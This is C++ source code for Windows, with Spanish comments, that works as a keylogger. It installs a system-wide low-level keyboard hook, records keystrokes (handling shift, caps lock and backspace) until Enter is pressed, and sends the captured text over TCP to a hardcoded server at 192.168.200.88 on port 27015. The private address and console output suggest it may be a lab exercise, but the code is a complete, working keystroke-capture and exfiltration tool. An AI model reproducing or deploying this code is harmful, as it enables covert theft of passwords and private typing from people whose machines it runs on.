#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <fstream>

#define DEFAULT_BUFLEN 512
#define PUERTO "27015"
#define SERVER_IP "192.168.200.88"
// Variables globales
HHOOK hHook = NULL;
std::string bufferEnviar;
std::wstring unicodeBuffer;

// Convertir utf16 (el estandar unicode en Windows) a utf8
std::string convertirUtf16AUtf8(const std::wstring &utf16str)
{
    int tamanio = WideCharToMultiByte(CP_UTF8, 0, utf16str.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (tamanio <= 0)
    {
        return "";
    }
    std::string utf8string(tamanio - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, utf16str.c_str(), -1, &utf8string[0], tamanio, nullptr, nullptr);
    return utf8string;
}



LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {

        static bool mayusculaFunciona = false;

        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;

        DWORD vkCodigo = pKeyboard->vkCode;

        BYTE estadosTecla[256];

        UINT scanCode = MapVirtualKey(vkCodigo, MAPVK_VK_TO_VSC);

        // Obtenemos el layout del teclado (El parametro 0 indica el layout del hilo actual)
        HKL layout = GetKeyboardLayout(0);
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            // Si no se puede obtener el estado del teclado
            if (!GetKeyboardState(estadosTecla))
            {
                return CallNextHookEx(hHook, nCode, wParam, lParam);
            }

            // Ver si se esta presionando shift o control, los cuales pueden generar caracteres especiales

            if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
            {
                estadosTecla[VK_SHIFT] |= 0x80;
            }

            if (GetAsyncKeyState(VK_CONTROL) & 0x8000)
            {
                estadosTecla[VK_CONTROL] |= 0x80;
            }


            if (GetAsyncKeyState(VK_MENU) & 0x8000) {
                  estadosTecla[VK_MENU] |= 0x80;
            }

            if (vkCodigo == VK_CAPITAL)
            {
                mayusculaFunciona = !mayusculaFunciona;
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }

            if (mayusculaFunciona)
            {
                estadosTecla[VK_CAPITAL] |= 0x01;
            }

            else
            {
                estadosTecla[VK_CAPITAL] &= ~0x01;
            }

            wchar_t buffer[5] = {0};
            int resultado = ToUnicodeEx(vkCodigo, scanCode, estadosTecla, buffer, 4, 0, layout);

         

            // Si se presiona back borramos contenido del buffer
            if (vkCodigo == VK_BACK)
            {
                // Si el buffer no esta vacio (evitar errores)
                if (!unicodeBuffer.empty())
                {
                    // Borramos el ultimo caracter
                    unicodeBuffer.pop_back();
                }
                return CallNextHookEx(hHook, nCode, wParam, lParam);
            }

            // Ignoramos todas las teclas del F1 al F12 y el TAB
            if ((vkCodigo >= VK_F1 && vkCodigo <= VK_F12) || vkCodigo == VK_TAB)
            {

                return CallNextHookEx(hHook, nCode, wParam, lParam);
            }

           
            // Si se presiona enter salimos
            if (vkCodigo == VK_RETURN)
            {
                PostQuitMessage(0);
            } else { // Si no se presiona enter seguir agregando al buffer (evitar \n)
               
                unicodeBuffer += buffer ;
            }
        }
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}
void obtenerMensajeAEnviar()
{
    // Establecer el hook
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (!hHook)
    {
        printf("Error al establecer el hook\n");
        exit(1);
    }

    // Bucle de mensajes
    MSG mensaje;
    while (GetMessage(&mensaje, NULL, 0, 0))
    {
        TranslateMessage(&mensaje);
        DispatchMessage(&mensaje);
    }

    // Liberar el hook
    UnhookWindowsHookEx(hHook);
}

void inicializarVariablesPistas(addrinfo &pistas)
{
    ZeroMemory(&pistas, sizeof(pistas));
    pistas.ai_family = AF_UNSPEC;
    pistas.ai_socktype = SOCK_STREAM;
    pistas.ai_protocol = IPPROTO_TCP;
}

void inicializarWinsock(int &bytesRecibidos, WSADATA &wsaData)
{

    // Inicializar la libreria
    bytesRecibidos = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (bytesRecibidos != 0)
    {
        printf("WSAStartup fallo con el error: %d\n", bytesRecibidos);
        exit(1);
    }
}

void resolverDireccionServidorPuerto(int &bytesRecibidos, addrinfo &pistas, addrinfo *&resultadoDireccion)
{
    // Resolver el nombre del servidor y el puerto
    bytesRecibidos = getaddrinfo(SERVER_IP, PUERTO, &pistas, &resultadoDireccion);
    if (bytesRecibidos != 0)
    {
        printf("getaddrinfo fallo con el error: %d\n", bytesRecibidos);
        WSACleanup();
        exit(1);
    }
}

void crearsocketConexion(addrinfo *&punteroDireccion, addrinfo *resultadoDireccion, SOCKET &socketConexion)
{
    // Asignamos el puntero de direccion al resultado
    punteroDireccion = resultadoDireccion;

    // Creamos un socket para conectarse al server
    socketConexion = socket(punteroDireccion->ai_family, punteroDireccion->ai_socktype,
                            punteroDireccion->ai_protocol);
    if (socketConexion == INVALID_SOCKET)
    {
        printf("Socket fallo con el error: %ld\n", WSAGetLastError());
        WSACleanup();
        exit(1);
    }
}

void conectarseAlServidor(int &bytesRecibidos, addrinfo *punteroDireccion, SOCKET &socketConexion)
{
    // Conectar al servidor
    bytesRecibidos = connect(socketConexion, punteroDireccion->ai_addr, (int)punteroDireccion->ai_addrlen);
    if (bytesRecibidos == SOCKET_ERROR)
    {
        closesocket(socketConexion);
        socketConexion = INVALID_SOCKET;
    }

    if (socketConexion == INVALID_SOCKET)
    {
        printf("Error al conectarse al servidor!\n");
        exit(1);
    }
}

void enviarBuffer(int &bytesRecibidos, SOCKET &socketConexion)
{

    bytesRecibidos = send(socketConexion, bufferEnviar.c_str(), (int)bufferEnviar.size(), 0);
    if (bytesRecibidos == SOCKET_ERROR)
    {
        printf("Envio fallo con el error: %d\n", WSAGetLastError());
        closesocket(socketConexion);
        WSACleanup();
        exit(1);
    }
}

void recibirRespuestaDelServidor(int &bytesRecibidos, SOCKET &socketConexion, char bufferRecibido[], int &bufferRecibidoLen)
{
    bytesRecibidos = recv(socketConexion, bufferRecibido, bufferRecibidoLen, 0);

    std::string respuesta;

    if (bytesRecibidos > 0)
    {
        respuesta = bufferRecibido;

        respuesta[bytesRecibidos] = '\0';
    }
    else if (bytesRecibidos == 0)
    {
        printf("Conexion cerrada\n");
    }
    else
    {
        printf("Recv fallo con el error: %d\n", WSAGetLastError());
    }
}

void cerrarConexion(int &bytesRecibidos, SOCKET &socketConexion)
{
    // Cerrar la conexion ya que no se va enviar mas datos
    bytesRecibidos = shutdown(socketConexion, SD_SEND);
    if (bytesRecibidos == SOCKET_ERROR)
    {
        printf("Cerrando con el error numero: %d\n", WSAGetLastError());
        closesocket(socketConexion);
        WSACleanup();
        exit(1);
    }
}

void limpiar(SOCKET &socketConexion)
{
    // Limpieza
    closesocket(socketConexion);
    WSACleanup();
}

void obtenerHora() {
    SYSTEMTIME horaUTC;


    GetSystemTime(&horaUTC);
    printf("Anio actual: %d\n", horaUTC.wYear);
    printf("Mes actual: %d\n", horaUTC.wMonth);
    printf("Dia actual: %d\n", horaUTC.wDay);
    printf("Hora actual UTC: %d\n", horaUTC.wHour);
    printf("Minuto actual UTC: %d\n", horaUTC.wMinute);
    printf("Segundo actual UTC: %d\n", horaUTC.wSecond);
   
}

void obtenerZonaHoraria() {
    TIME_ZONE_INFORMATION informacionZona;

    GetTimeZoneInformation(&informacionZona);

    std::string nombreZona;

    nombreZona = convertirUtf16AUtf8(informacionZona.StandardName);

    std::cout<<"Nombre zona: "<<nombreZona<<std::endl;
}


int main(int argc, char **argv)
{
    WSADATA wsaData;
    SOCKET socketConexion = INVALID_SOCKET;
    struct addrinfo *resultadoDireccion = NULL;
    struct addrinfo *punteroDireccion = NULL;
    struct addrinfo pistas;
    char bufferRecibido[DEFAULT_BUFLEN];
    int bytesRecibidos;
    int bufferRecibidoLen = DEFAULT_BUFLEN;
    obtenerHora();
    obtenerZonaHoraria();
    obtenerMensajeAEnviar();
 
    bufferEnviar = convertirUtf16AUtf8(unicodeBuffer);
  
    std::cout << bufferEnviar << "\n";

    inicializarVariablesPistas(pistas);

    inicializarWinsock(bytesRecibidos, wsaData);

    resolverDireccionServidorPuerto(bytesRecibidos, pistas, resultadoDireccion);

    crearsocketConexion(punteroDireccion, resultadoDireccion, socketConexion);

    conectarseAlServidor(bytesRecibidos, punteroDireccion, socketConexion);

    freeaddrinfo(resultadoDireccion);

    enviarBuffer(bytesRecibidos, socketConexion);

    recibirRespuestaDelServidor(bytesRecibidos, socketConexion, bufferRecibido, bufferRecibidoLen);

    cerrarConexion(bytesRecibidos, socketConexion);

    limpiar(socketConexion);

    return 0;
}